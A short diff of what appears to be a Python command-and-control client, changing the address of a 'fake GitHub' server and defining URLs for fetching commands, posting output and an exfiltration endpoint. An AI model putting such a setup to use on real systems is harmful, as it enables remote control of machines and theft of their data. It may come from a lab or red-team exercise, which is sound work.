@@ -8,7 +8,7 @@ import subprocess
 import ctypes
 
 # Configuration URLs for your fake GitHub server
-FAKE_GITHUB_BASE = "http://192.168.1.4/fake-github"
+FAKE_GITHUB_BASE = "http://10.10.10.2/fake-github"
 COMMANDS_URL = FAKE_GITHUB_BASE + "/Commands.txt"
 OUTPUT_URL   = FAKE_GITHUB_BASE + "/Output.txt"
 EXFIL_BASE_URL = FAKE_GITHUB_BASE + "/Exfiltration"
